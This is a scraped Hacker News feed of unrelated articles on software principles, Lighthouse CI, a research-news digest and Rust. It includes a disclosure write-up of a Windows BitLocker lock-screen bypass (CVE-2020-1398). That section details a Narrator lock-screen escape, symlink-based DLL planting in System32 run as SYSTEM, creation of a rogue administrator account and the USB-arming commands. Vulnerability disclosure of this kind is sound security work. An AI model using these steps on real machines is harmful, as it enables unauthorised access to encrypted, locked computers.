<p>I used to be eager about building extensively functional software: the more features, the better. I'm not anymore. Instead, I try to develop software that works well for my users. I strive for quality. So I try to measure my build's size. I take proper care about delivering my application, meaning I turn on compression and <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Caching">caching</a>. I care about optimizing my static assets like pictures. And I like to check my apps by using tools like <a target="_blank" rel="noopener" href="https://developers.google.com/speed/pagespeed/insights/?hl=de">PageSpeed Insights</a> or <a target="_blank" rel="noopener" href="https://developers.google.com/web/tools/lighthouse">lighthouse</a>.</p>
<h2 id="i-use-my-own-work">I use my own work</h2>
<p>From experience, I learned that I hardly ever get stuck on a algorithmic problem. On the contrary, I get motivated to learn something new and excel in the process. However, I caught my self often spending many hours on debugging other people's code. Mainly when it's third-party libraries that I included via npm. Once, I thought that using npm packages was a JavaScript developer's superpower. Now, I know that it can also be their curse.</p>
<p>Instead of collecting heaps of third-party code, I now prefer following <a target="_blank" rel="noopener" href="http://hintjens.com/blog:96">Peter Hintjens' principles for writing good code</a>. I "use my own work." Meaning, I dare to write seemingly complex code myself. I still won't roll my own crypto or write a date library, but I dare to implement parts of a protocol or build an algorithm. It's not to say that I ditch every npm package and go npm-keto-diet. No, instead, I take a more mindful approach towards dependencies and only include them when I truly need them.</p>
<p>I try to do that by leaving my technical vision at the doorstep of my office, so that I can now focus on solving the problems at hand. I try to stop worrying about eventualities far in the future as I view that as speculation. In cases I have past experiences, I use it to form my decision. For unchartered teritory, I move carefully, step by step.</p>
<h2 id="i-use-open-source-to-my-advantage.">I use open source to my advantage.</h2>
<p>I'm building websites since I'm a teenager. And had I open-sourced and maintained a few pieces of code that I need frequently, I'd be more productive now. Unfortunately, I was short-sighted. Surprisingly, I didn't think about still using JavaScript at 29 years of age 😂</p>
<p>I stopped framing open source mainly around certain virtues like free speech, fairness or certain politics. They're still important virtues for me, but I learned that I could use open source also for building a personal toolset.</p>
<p>Extracting a library from a codebase allows me to think about it from a user's perspective. It means I'm able to think about a piece of code's interfaces emphatically. Additionally, there's positive peer pressure. I'm not going to release shit to the world. When my project is public, it's going to have a proper README and some docs. And it's going to be tested. Since everybody can see it, I might as well create something I can be proud of.</p>
<p>Hence, contributing to open source, for me, is about building high-quality software. Being anxious about not being able to monetize this particular piece of code has become less of a concern. <a target="_blank" rel="noopener" href="https://github.com/sindresorhus">sindresohrus</a> inspired me to treat open source packages like my personal toolbox.</p>
<h2 id="conclusion">Conclusion</h2>
<p>And that's my incomplete list of principles. I'm sure there's more than just these. Anyway, I still find some of these points quite controversial. I'm sure they won't work for everyone as all our contexts differ. But working solo as a freelancer, I've found that these principles contribute to me being content about what I'm doing. Hence, I was eager to share them.</p>
<p>I'm curious to hear other's thoughts and see if they've taken similar paths. Please reach out! Also, don't forget to subscribe to my newsletter!</p>

  </div></div>]]>
            </description>
            <link>https://timdaub.github.io/2021/01/16/web-principles/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25809132</guid>
            <pubDate>Sun, 17 Jan 2021 08:23:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[BitLocker Lockscreen Bypass]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25808059">thread link</a>) | @notRobot
<br/>
January 16, 2021 | https://secret.club/2021/01/15/bitlocker-bypass.html | <a href="https://web.archive.org/web/*/https://secret.club/2021/01/15/bitlocker-bypass.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>BitLocker is a modern data protection feature that is deeply integrated in the Windows kernel. It is used by many corporations as a means of protecting company secrets in case of theft. Microsoft recommends that you have a Trusted Platform Module which can do some of the heavy cryptographic lifting for you.</p><p>Given a Windows 10 system without known passwords and a BitLocker-protected hard drive, an administrator account could be adding by doing the following:</p><ul><li>At the sign-in screen, select “I have forgotten my password.”</li><li>Bypass the lock and enable autoplay of removable drives.</li><li>Insert a USB stick with my .exe and a junction folder.</li><li>Run executable.</li><li>Remove the thumb drive and put it back in again, go to the main screen.</li><li>From there launch narrator, that will execute a DLL payload planted earlier.</li></ul><p>Now a user account is added called hax with password “hax” with membership in Administrators. To update the list with accounts to log into, click <em>I forgot my password</em> and then return to the main screen.</p><h2 id="bypassing-the-lock-screen"> <a href="#bypassing-the-lock-screen">Bypassing the lock screen</a></h2><p>First, we select the “I have forgotten my password/PIN” option. This option launches an additional session, with an account that gets created/deleted as needed; the user profile service calls it a default-account. It will have the first available name of defaultuser1, defaultuser100000, defaultuser100001, etc.</p><p>To escape the lock, we have to use the Narrator because if we manage to launch something, we cannot see it, but using the Narrator, we will be able to navigate it. However, how do we launch something?</p><p><img src="https://secret.club/assets/bitlockerbypass/1.png" alt=""></p><p>If we smash shift 5 times in quick succession, a link to open the Settings app appears, and the link actually works. We cannot see the launched Settings app. Giving the launched app focus is slightly tricky; you have to click the link and then click a place where the launched app would be visible with the correct timing. The easiest way to learn to do it is, keep clicking the link roughly 2 times a second. The sticky keys windows will disappear. Keep clicking! You will now see a focus box is drawn in the middle of the screen. That was the Settings app, and you have to stop clicking when it gets focus.</p><p>Now we can navigate the Settings app using CapsLock + Left Arrow, press that until we reach Home. Now, when Home has focus, hold down Caps Lock and press Enter. Using CapsLock + Right Arrow navigate to Devices and CapsLock + Enter when it is in focus.</p><p><img src="https://secret.club/assets/bitlockerbypass/2.png" alt=""></p><p>Now navigate to AutoPlay, CapsLock + Enter and choose “Open Folder to view files (File Explorer).” Now insert the prepared USB drive, wait some seconds, the Narrator will announce the drive has been opened, and the window is focused. Now select the file <strong>Exploit.exe</strong> and execute it with CapsLock + Enter. That is arbitrary code execution, ladies and gentlemen, without using any passwords. However, we are limited by running as the default profile.</p><p>I have made a video with my phone, as I cannot take screenshots.</p><iframe width="560" height="315" src="https://www.youtube.com/embed/ZdsSgklRoag" frameborder="0" allowfullscreen=""></iframe><h2 id="elevation-of-privilege"> <a href="#elevation-of-privilege">Elevation of privilege</a></h2><p>When a USB stick is mounted, BitLocker will create a directory named ClientRecoveryPasswordRotation in System Volume Information and set permissions to:</p><div><div><pre><code>NT AUTHORITY\Authenticated Users:(F)
NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
</code></pre></div></div><p>To redirect the create operation, a symbolic link in the NT namespace is needed as that allows us to control the filename, and the existence of the link does not abort the operation as it is still creating the directory.</p><p>Therefore, take a USB drive and make <code>\System Volume Information</code> a mount point targeting <code>\RPC Control</code>. Then make a symbolic link in <code>\RPC Control\ClientRecoveryPasswordRotation</code> targetting <code>\??\C:\windows\system32\Narrator.exe.local</code>. If the USB stick is reinserted then the folder <code>C:\windows\system32\Narrator.exe.local</code> will be created with permissions that allows us to create a subdirectory:</p><div><div><pre><code>amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.657_none_e6c5b579130e3898
</code></pre></div></div><p>Inside this subdirectory, we drop a payload DLL named <em>comctl32.dll</em>. Next time the Narrator is triggered, it will load the DLL. By the way, I chose the Narrator as that is triggerable from the login screen as a system service and is not auto-loaded, so if anything goes wrong, we can still boot.</p><h2 id="combining-them"> <a href="#combining-them">Combining them</a></h2><p>The <code>ClientRecoveryPasswordRotation</code> exploit to work requires a symbolic link in <code>\RPC Control</code>. The executable on the USB drive creates the link using two calls to <code>DefineDosDevice</code>, making the link permanent so they can survive a logout/in if needed.</p><p>Then a loop is started in which the executable will:</p><ul><li>Try to create the subdirectory.</li><li>Plant the payload <code>comctl32.dll</code> inside it.</li></ul><p>It is easy to see when the loop is running because the Narrator will move its focus box and say “access denied” every second. We can now use the link created in <code>RPC Control</code>. Unplug the USB stick and reinsert it. The writeable directory will be created in <code>System32</code>; on the next loop iteration, the payload will get planted, and exploit.exe will exit. To test if the exploit has been successful, close the Narrator and try to start it again.</p><p>If the narrator does not work, it is because the DLL is planted, and Narrator executes it, but it fails to add an account because it is launched as <code>defaultuser1</code>. When the payload is planted, you will need to click back to the login screen and start Narrator; 3 beeps should play, and a message box saying the DLL has been loaded as <code>SYSTEM</code> should show. Great! The account has been created, but it is not in the list. Press “I forgot my password” and click back to update the list.</p><p>A new account named hax should appear, with password hax.</p><p>I used these steps to arm the USB device</p><div><div><pre><code>C:\Users\jonas&gt;format D: /fs:ntfs /q
Insert new disk for drive D:
Press ENTER when ready...
-----
File System: NTFS.
Quick Formatting 30.0 GB
Volume label (32 characters, ENTER for none)?
Creating file system structures.
Format complete.
30.0 GB total disk space.
30.0 GB are available.
</code></pre></div></div><p>Now, we need to elevate to admin to delete <code>System Volume Information</code>.</p><div><div><pre><code>C:\Users\jonas&gt;d:
D:\&gt;takeown /F "System Volume Information"
</code></pre></div></div><p>This results in</p><div><div><pre><code>SUCCESS: The file (or folder): "D:\System Volume Information" now owned by user "DESKTOP-LTJEFST\jonas".
</code></pre></div></div><p>We can then</p><div><div><pre><code>D:\&gt;icacls "System Volume Information" /grant Everyone:(F)
Processed file: System Volume Information
Successfully processed 1 files; Failed processing 0 files
D:\&gt;rmdir /s /q "System Volume Information"
</code></pre></div></div><p>We will use James Forshaw’s tool (attached) to create the mount point.</p><div><div><pre><code>D:\&gt;createmountpoint "System Volume Information" "\RPC Control"
</code></pre></div></div><p>Then copy the attached exploit.exe to it.</p><div><div><pre><code>D:\&gt;copy c:\Users\jonas\source\repos\exploitKit\x64\Release\exploit.exe .
1 file(s) copied.
</code></pre></div></div><p>I disclosed this vulnerability and it was assigned CVE-2020-1398. Its patch can be found <a href="https://msrc.microsoft.com/update-guide/en-us/vulnerability/CVE-2020-1398">here</a></p></div></div>]]>
            </description>
            <link>https://secret.club/2021/01/15/bitlocker-bypass.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25808059</guid>
            <pubDate>Sun, 17 Jan 2021 04:16:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dissecting modern (3G/4G) cellular modems (2016)]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25807836">thread link</a>) | @pabs3
<br/>
January 16, 2021 | https://media.ccc.de/v/33c3-8151-dissecting_modern_3g_4g_cellular_modems | <a href="https://web.archive.org/web/*/https://media.ccc.de/v/33c3-8151-dissecting_modern_3g_4g_cellular_modems">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">



<div>

<p>
<span></span>
<a href="https://media.ccc.de/search?p=LaForge">LaForge</a> and
<a href="https://media.ccc.de/search?p=holger">holger</a>

</p>
<p>
Playlists:
<a href="https://media.ccc.de/v/33c3-8151-dissecting_modern_3g_4g_cellular_modems/playlist">'33c3' videos starting here</a>
/
<a data-method="get" href="https://media.ccc.de/v/33c3-8151-dissecting_modern_3g_4g_cellular_modems/audio">audio</a>
/
<a href="https://media.ccc.de/v/33c3-8151-dissecting_modern_3g_4g_cellular_modems/related">related events</a></p>
<!-- %h3 About -->
<p>Let's have a detailed look at some modern 3G/4G cellular modems and see what we can find out about their internals using undocumented debug interfaces and software or hardware based hacking techniques.</p>

<h3>Download</h3>
<div>
<div>

<div>

<div>
<div>
<h4>These files contain multiple languages.</h4>
<p>
This Talk was translated into multiple languages. The files available
for download contain all languages as separate audio-tracks. Most
desktop video players allow you to choose between them.
</p>
<p>
Please look for "audio tracks" in your desktop video player.
</p>
</div>
</div>
</div>


</div>

</div>
<h3>Related</h3>


<!-- %h3 Embed/Share -->

<h3>Tags</h3>

</div>





</div>]]>
            </description>
            <link>https://media.ccc.de/v/33c3-8151-dissecting_modern_3g_4g_cellular_modems</link>
            <guid isPermaLink="false">hacker-news-small-sites-25807836</guid>
            <pubDate>Sun, 17 Jan 2021 03:32:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Lighthouse Reports as GitHub Comment]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25807724">thread link</a>) | @bleonard
<br/>
January 16, 2021 | https://www.grouparoo.com/blog/lighthouse-reports-on-github | <a href="https://web.archive.org/web/*/https://www.grouparoo.com/blog/lighthouse-reports-on-github">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="blogContent"><div><p>Performance is an important factor for user satisfaction, conversion and SEO. <a href="https://github.com/GoogleChrome/lighthouse" target="_blank" rel="nofollow noopener noreferrer">Lighthouse</a> is a tool that creates a report on performance and other best practices. Most commonly, it used from the <a href="https://chrome.google.com/webstore/detail/lighthouse/blipmdconlkpinefehnmjammfjpmpbjk" target="_blank" rel="nofollow noopener noreferrer">chrome extension</a>.</p><div><p><img height="271" width="519" alt="Lighthouse Chrome extension" src="https://www.grouparoo.com/posts/lighthouse-reports-on-github/chrome-extension.png"></p></div><p>However, you can also run this test locally. The <code>@lhci/cli</code> library, when installed, provides the following command line tool.</p><pre><code><span>&gt;</span> next build
info  - Creating an optimized production build
info  - Compiled successfully
info  - Collecting page data
info  - Generating static pages <span>(</span><span>123</span>/123<span>)</span>
info  - Finalizing page optimization
<span>..</span>.

<span>&gt;</span> lhci autorun
✅  .lighthouseci/ directory writable
✅  Configuration <span>file</span> found
✅  Chrome installation found
Healthcheck passed<span>!</span>

Started a web server with <span>"PORT=54321 npm start"</span><span>..</span>.
Running Lighthouse <span>1</span> time<span>(</span>s<span>)</span> on http://localhost:54321/about
Run 
<span>..</span>.
Done running Lighthouse<span>!</span>

Uploading median LHR of http://localhost:54321/about<span>..</span>.success<span>!</span>
Open the report at https://storage.googleapis.com/lighthouse-infrastructure.appspot.com/reports/1610848080418-24331.report.html
<span>..</span>.

Done running autorun.
</code></pre><p>This will run for all the URLs that you tell it, launching a headless chrome browser one or more times for each to generate a report.</p><div><p><img height="180" width="519" alt="Lighthouse report from local run" src="https://www.grouparoo.com/posts/lighthouse-reports-on-github/local-report.png"></p></div><p>I have also noticed that the numbers (performance) on <code>localhost</code> are slower than on our production site. This is likely because the production site takes advantage of a CDN and other caching features. For example, the 84 score above on the <code>/about</code> page is a 96 on production. However, the local numbers correlate with the production ones.</p><h2>Configuration</h2><p>To make <code>lhci autorun</code> work how you want it, you'll need some configuration in the <code>lighthouserc.js</code> file. Ours exports this:</p><pre><code>module<span>.</span><span>exports</span> <span>=</span> <span>{</span>
  ci<span>:</span> <span>{</span>
    collect<span>:</span> <span>{</span>
      numberOfRuns<span>:</span> <span>1</span><span>,</span>
      url<span>:</span> urls<span>,</span>
      startServerCommand<span>:</span> <span>"PORT=54321 npm start"</span><span>,</span>
      settings<span>:</span> <span>{</span>
        onlyCategories<span>:</span> <span>[</span>
          <span>"performance"</span><span>,</span>
          <span>"best-practices"</span><span>,</span>
          <span>"accessibility"</span><span>,</span>
          <span>"seo"</span><span>,</span>
        <span>]</span><span>,</span> 
        skipAudits<span>:</span> <span>[</span>
          <span>"canonical"</span><span>,</span> 
        <span>]</span><span>,</span>
      <span>}</span><span>,</span>
    <span>}</span><span>,</span>
    upload<span>:</span> <span>{</span>
      target<span>:</span> <span>"temporary-public-storage"</span><span>,</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</code></pre><p>The most interesting thing about <a href="https://github.com/grouparoo/www.grouparoo.com/blob/f93ce04b26900dd7473e0ac9584d5f46a3031efb/lighthouserc.js" target="_blank" rel="nofollow noopener noreferrer">our implementation</a> is that it reads the sitemap so that it automatically tests all the URLs that we give to search engines. As a related matter, we are also <a href="https://github.com/grouparoo/www.grouparoo.com/blob/f93ce04b26900dd7473e0ac9584d5f46a3031efb/scripts/generate_static_files.ts" target="_blank" rel="nofollow noopener noreferrer">auto-generating</a> our sitemap, so this means that every time we add a page, the new page will be performance tested.</p><p>I found that setting <code>numberOfRuns</code> more than <code>1</code> just took too long. Testing a URL more than once gives more accurate results, so the tradeoff was whether to really test every page or have less accurate results. I chose to test every page and haven't seen too much variance in the results so far.</p><h2>Comment on the Pull Request</h2><p>Testing and monitoring are great, but they have to be a part of the real workflow to make any difference. I decided to start with visibility. We can update this to fail a check and prevent a merge when there is a low score later.</p><p>To add this visibility, I <a href="https://github.com/grouparoo/www.grouparoo.com/blob/f93ce04b26900dd7473e0ac9584d5f46a3031efb/.github/workflows/performance.yml#L2-L11" target="_blank" rel="nofollow noopener noreferrer">set up</a> Github to <a href="https://github.com/grouparoo/www.grouparoo.com/blob/f93ce04b26900dd7473e0ac9584d5f46a3031efb/.github/workflows/performance.yml#L12-L14" target="_blank" rel="nofollow noopener noreferrer">run an command</a> on every pull request when there is a commit.</p><p>The <a href="https://github.com/grouparoo/www.grouparoo.com/blob/f93ce04b26900dd7473e0ac9584d5f46a3031efb/scripts/performance_action" target="_blank" rel="nofollow noopener noreferrer">command</a> runs <code>lchi autorun</code> and then a script.</p><p>The <a href="https://github.com/grouparoo/www.grouparoo.com/blob/f93ce04b26900dd7473e0ac9584d5f46a3031efb/scripts/write_lighthouse_comment.ts" target="_blank" rel="nofollow noopener noreferrer">script</a> knows that <code>lhci autorun</code> puts performance reports as JSON in a certain place. It find those and generates a markdown table and writes that to disk.</p><p>Now, back in the Github action, it <a href="https://github.com/grouparoo/www.grouparoo.com/blob/f93ce04b26900dd7473e0ac9584d5f46a3031efb/.github/workflows/performance.yml#L15-L18" target="_blank" rel="nofollow noopener noreferrer">uses</a> the markdown to make a comment that gets updated each time there is a commit.</p><p>The result is a comment on each pull request like this <a href="https://github.com/grouparoo/www.grouparoo.com/pull/152#issuecomment-759074302" target="_blank" rel="nofollow noopener noreferrer">one</a>:</p><div><p><img height="485" width="990" alt="Lighthouse report as a Github comment" src="https://www.grouparoo.com/posts/lighthouse-reports-on-github/github-comment.png"></p></div><p>Each URL shows its Lighthouse overview and links to the real report. Success!</p><h3>Meta!</h3><p>Even the <a href="https://github.com/grouparoo/www.grouparoo.com/pull/154" target="_blank" rel="nofollow noopener noreferrer">pull request</a> for this blog post ran a <a href="https://github.com/grouparoo/www.grouparoo.com/runs/1715541127" target="_blank" rel="nofollow noopener noreferrer">check</a> got a report. 💥</p><div><p><img height="59" width="990" alt="Lighthouse report for this blog post!" src="https://www.grouparoo.com/posts/lighthouse-reports-on-github/meta.png"></p></div></div></div></div>]]>
            </description>
            <link>https://www.grouparoo.com/blog/lighthouse-reports-on-github</link>
            <guid isPermaLink="false">hacker-news-small-sites-25807724</guid>
            <pubDate>Sun, 17 Jan 2021 03:10:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[When parties reverse their stance, supporters immediately switch their opinions]]>
            </title>
            <description>
<![CDATA[
Score 187 | Comments 195 (<a href="https://news.ycombinator.com/item?id=25807656">thread link</a>) | @nabla9
<br/>
January 16, 2021 | https://thespeakernewsjournal.com/science/when-political-parties-reverse-their-policy-stance-their-supporters-immediately-switch-their-opinions-too/ | <a href="https://web.archive.org/web/*/https://thespeakernewsjournal.com/science/when-political-parties-reverse-their-policy-stance-their-supporters-immediately-switch-their-opinions-too/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page">
				<div id="content">
			
	<div id="primary">
		<main id="main">
			
<article id="post-15093" itemtype="https://schema.org/CreativeWork" itemscope="">
	<div>
				
					
			
		<div itemprop="text">
			<p>At least a significant portion of their supporters, according to U of Aarhus researchers.</p>
<p>When two competing political parties in Denmark reversed their policy stance on an issue — suddenly they both supported reducing unemployment benefits — their voters immediately moved their opinions by around 15% into line with their party.</p>
<p>The same thing happened when one of these parties shifted from opposing to supporting ending Denmark’s early retirement.</p>
<p>The researchers were studying how public opinion is formed. Their recent paper sheds light on how much influence political parties have over their supporters, according to the researchers, who surveyed their panel of subjects in five successive waves between 2010 and 2011. They studied the same group of party supporters before, during and after a policy reversal.</p>
<p>“We can see that [the] welfare programs were actually quite popular … and many of the voters of the center-right party were in favor of these welfare programs,” commented one of the researchers, Rune Slothuus. “Nevertheless, we can see that they reversed their opinion from supporting these welfare programs to opposing these welfare programs.”</p>
<p dir="ltr">“I was surprised to see the parties appeared this powerful in shaping opinions,” Slothuus said. “Our findings suggest that partisan leaders can indeed lead citizens’ opinions in the real world, even in situations where the stakes are real and the economic consequences tangible.”</p>
<p dir="ltr">The researchers pondered Western democracy in light of their findings: “If citizens just blindly follow their party without thinking much about it, that should lead to some concern about the mechanisms in our democracy. Because how can partisan elites represent citizens’ views if the views of citizens are shaped by the very same elites who are supposed to represent them?”</p>
<h6 dir="ltr">Source: How Political Parties Shape Public Opinion in the Real World.  and <a id="a2_Ctrl" role="button" href="https://onlinelibrary.wiley.com/action/doSearch?ContribAuthorStored=Bisgaard%2C+Martin" data-id="a2" data-db-target-for="a2" aria-controls="a2" aria-haspopup="true">Martin Bisgaard. </a><span>First published: </span><span>04 November 2020</span> <a href="https://doi.org/10.1111/ajps.12550" aria-label="Digital Object Identifier">https://doi.org/10.1111/ajps.12550</a></h6>

						


<div>
    <h3>The brain listens for things it is trying to predict</h3>
    <div><p>The brain interprets sounds as they contrast with its expectations; it recognizes patterns of sounds faster when they’re in line with what it is predicting it will hear, but it only encodes sounds when they contrast with expectations, according to <span>Technische U researchers. </span></p>
<p>The researchers showed this by monitoring the two principal nuclei of the subcortical pathway responsible for auditory processing: the inferior colliculus and the medial geniculate body, as their subjects listened to patterns of sounds which the researches modified so that sometimes they would hear an expected sound pattern, and other times something unexpected.</p>
<h6>Source: Alejandro Tabas, Glad Mihai, Stefan Kiebel, Robert Trampel, Katharina von Kriegstein. <strong>Abstract rules drive adaptation in the subcortical sensory pathway</strong>. <em>eLife</em>, 2020; 9 DOI: <a href="http://dx.doi.org/10.7554/eLife.64501" target="_blank" rel="nofollow noopener">10.7554/eLife.64501</a></h6>
</div>
</div>
						


<div>
    <h3>We have a particular way of understanding a room</h3>
    <div><p>When several research subjects were instructed to explore an empty room, and when they were instead seated in a chair and watched someone else explore the room, their brain waves followed a certain pattern, as recorded by a backpack hooked up to record their brain waves, eye movements, and paths. It didn’t matter if they were walking or watching someone else, according to UC researchers led by Dr Matthias Stangl.</p>
<p>The researchers also tested what happened when subjects searched for a hidden spot, or watched someone else do so, and found that brain waves flowed more strongly when they had a goal and hunted for something.</p>
<h6>Source: Matthias Stangl, Uros Topalovic, Cory S. Inman, Sonja Hiller, Diane Villaroman, Zahra M. Aghajan, Leonardo Christov-Moore, Nicholas R. Hasulak, Vikram R. Rao, Casey H. Halpern, Dawn Eliashiv, Itzhak Fried, Nanthia Suthana. <strong>Boundary-anchored neural mechanisms of location-encoding for self and others</strong>. <em>Nature</em>, 2020; DOI: <a href="http://dx.doi.org/10.1038/s41586-020-03073-y" target="_blank" rel="nofollow noopener">10.1038/s41586-020-03073-y</a></h6>
</div>
</div>
						


<div>
    <h3>Extroverts and introverts use different vocabularies</h3>
    <div><p>Extroverts use ‘positive emotion’ and ‘social process’ words more often than introverts, according to new research conducted at <span>Nanyang Technological U</span>.</p>
<p>‘Love,’ ‘happy,’ and ‘blessed’ indicate pleasant emotions, and ‘beautiful’ and ‘nice’ indicate positivity or optimism, and are among the words found to be used more often by extroverts. So too are ‘meet,’ ‘share,’ and ‘talk,’ which are about socializing. Extroverts use personal pronouns — except ‘I’ — more too, another indication of sociability.</p>
<p>The correlation, however, was small, and the researchers think that stronger linguistic indicators need to be found to achieve their general goal, which is improving machine learning approaches to targeting consumer marketing.</p>
<h6>Source: Jiayu Chen, Lin Qiu, Moon-Ho Ringo Ho. <strong>A meta-analysis of linguistic markers of extraversion: Positive emotion and social process words</strong>. <em>Journal of Research in Personality</em>, 2020; 89: 104035 DOI: <a href="http://dx.doi.org/10.1016/j.jrp.2020.104035" target="_blank" rel="nofollow noopener">10.1016/j.jrp.2020.104035</a></h6>
</div>
</div>
						


<div>
    <h3>WhatsApp is changing today - Users must give the app permission to send their private data to Facebook or lose account</h3>
    <div><p>WhatsApp was bought by Facebook in 2014, but has thrived while promoting itself as a privacy-respecting messaging app that now has 1.5b monthly active users. This week, though, WhatApp sent out an update to users’ phones that they must ‘consent’ to a new policy or lose access.</p>
<p>Whatsapp will now share more of your data, including your IP address (your location) and phone number, your account registration information, your transaction data, and service-related data, interactions on WhatsApp, and other data collected based on your consent, with Facebook’s other companies. Facebook has been working towards more closely integrating Facebook, WhatsApp, Instagram and Messenger.</p>
<p>Users who do not agree to ‘consent’ to the new policy will see their WhatsApp account become inaccessible until they do ‘consent.’ These accounts will remain dormant for 120 days after which they will be ‘deleted.’</p>
<p>The biggest change to the user policy, which many people ignored and clicked ‘agree’ to, thinking it was just another unimportant app update message, now reads,</p>
<blockquote><p><em>‘We collect information about your activity on our Services, like service-related, diagnostic, and performance information. This includes information about your activity (including how you use our Services, your Services settings, how you interact with others using our Services (including when you interact with a business), and the time, frequency, and duration of your activities and interactions), log files, and diagnostic, crash, website, and performance logs and reports. This also includes information about when you registered to use our Services; the features you use like our messaging, calling, Status, groups (including group name, group picture, group description), payments or business features; profile photo, “about” information; whether you are online, when you last used our Services (your “last seen”); and when you last updated your “about” information.’</em></p></blockquote>
<p>Notably, Elon Musk tweeted on the news, saying that WhatsApp users should switch to Signal, one of several popular privacy-focused messaging apps similar to WhatsApp.</p>
<p>The data sharing policy change doesn’t affect people in Europe due to GDPR data protection regulations.</p>
</div>
</div>
						


<div>
    <h3>President Trump silenced on top social media platforms after mob storms Capitol</h3>
    <div><p>The US president was locked out from posting new messages on his Facebook and Twitter accounts after an unruly group of supporters assembled outside the capitol building where Biden’s election win was being confirmed.</p>
<p>The lockdown on Twitter lasted 12 hours until the president removed tweets Twitter said violated its ‘civic integrity policy,’ but Zuckerburg said that Trump would be silenced on Facebook and Instagram for at least two more weeks until his presidential term was over. Facebook and Twitter are two of the main ways the president communicates with citizens and the world.</p>
<p>It is the first time social media platforms have chosen to limit the free speech of such an important figure.</p>
<h6><em>Trump’s tweets from Jan 6, 2020, as recorded by thetrumparchive.com</em></h6>


<p>Many news organizations covered the story using language such as <a href="https://thespeakernewsjournal.com/wp-content/uploads/2021/01/Trump-Incites-Rioters.png" target="_blank" rel="noopener" data-slb-active="1" data-slb-asset="69001008" data-slb-internal="0" data-slb-group="15093_15041">‘Trump Incites Rioters.’</a></p>
<p>Following Trumps ‘ban,’ there was renewed talk about treating social media platforms, where people share informative content, as publishers themselves, in part because their algorithms amplify things shared when those things are engaging. There was also talk about how the social media platforms that censored the president’s content did so as a response to content or events but without first drawing their ‘red line’ and saying which content is and isn’t allowed on their platforms.</p>
<p>Some of Trump’s staff resigned following the incident at the Capitol building, and there were also a lot of questions why the national guard wasn’t capable of handling the incident properly.</p>
<p>UPDATE January 8: Twitter permanently banned Trump’s account. Google removed Parler, an app like Twitter used by Trump supporters, from the Android app store to make it harder for people to download it, saying Google requires social media apps to have content moderation policies to remove posts that incite violence.</p>
</div>
</div>		</div>

				
			</div>
</article>

			

					</main>
	</div>

	

	</div>
</div></div>]]>
            </description>
            <link>https://thespeakernewsjournal.com/science/when-political-parties-reverse-their-policy-stance-their-supporters-immediately-switch-their-opinions-too/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25807656</guid>
            <pubDate>Sun, 17 Jan 2021 02:56:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Tragedy of Gemini]]>
            </title>
            <description>
<![CDATA[
Score 60 | Comments 28 (<a href="https://news.ycombinator.com/item?id=25807633">thread link</a>) | @panic
<br/>
January 16, 2021 | https://maya.land/monologues/2021/01/11/the-tragedy-of-gemini.html | <a href="https://web.archive.org/web/*/https://maya.land/monologues/2021/01/11/the-tragedy-of-gemini.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://maya.land/monologues/2021/01/11/the-tragedy-of-gemini.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25807633</guid>
            <pubDate>Sun, 17 Jan 2021 02:52:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Scientific Computing in Rust]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25807341">thread link</a>) | @mort96
<br/>
January 16, 2021 | https://aftix.xyz/home/bacon/ | <a href="https://web.archive.org/web/*/https://aftix.xyz/home/bacon/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>While getting my degree in Physics, I had to take classes in both MatLab and Python
for scientific computing. I preferred python, where we used the SciPy and NumPy
packages. In fact, I used those packages again (along with matplotlib) in an
undergraduate research project simulating bacteria films. There's a catch: I was
also pursuing a degree in Computer Science, and Python just wasn't fast enough
for that side of me, so, during my free time in graduate school, I rewrote my biofilm
simulation in my new favorite language, Rust.</p>
<p>First problem: I needed to replace
<code>jsonpickle</code> for data serialization. This problem was easy, as the <code>serde</code> crate
is an amazing replacement (I even transitioned from JSON to Rusty Object Notation, RON).
Second problem: Should I try to get matplotlib bindings in Rust or should I use
a more Rust-y plotting library? I decided on the latter, finding <code>plotters</code> to be
a suitable replacement for matplotlib. Last problem: How do I replace the differential
equation solvers of SciPy? I ended up writing a custom predictor-corrector solver
which worked well enough, giving identical simulation results while being five
hundred times faster than my python code at just the simulation step, rendering
not included (plotting directly to an RGB buffer then using libx264 bindings to
generate raw H.264 frames that mpv can understand also gave a similar speedup to
the rendering step over writing out every frame as a png file in matplotlib and
using a shell script to ffmpeg the outputs together). Full disclosure, a large part
of this speedup probably comes from my <em>derivative</em> function being not-python, rather
than my implementation of a differential equation solver over SciPy's. Furthermore,
I only breached the five hundred barrier when switching to using a QuadTree to
find the nearest neighbors of a bacteria, before that the speed up was more in
the three hundreds. This port of my old project can be found <a href="https://github.com/aftix/rustfilm">here</a>
if you care for some reason.</p>
<h2>Introducing bacon-sci</h2>
<p>Inspired, I decided to start on a full SciPy replacement in rust as I could not find
one I liked on crates.io (I later found the <code>peroxide</code> crate). I even had a clever name:
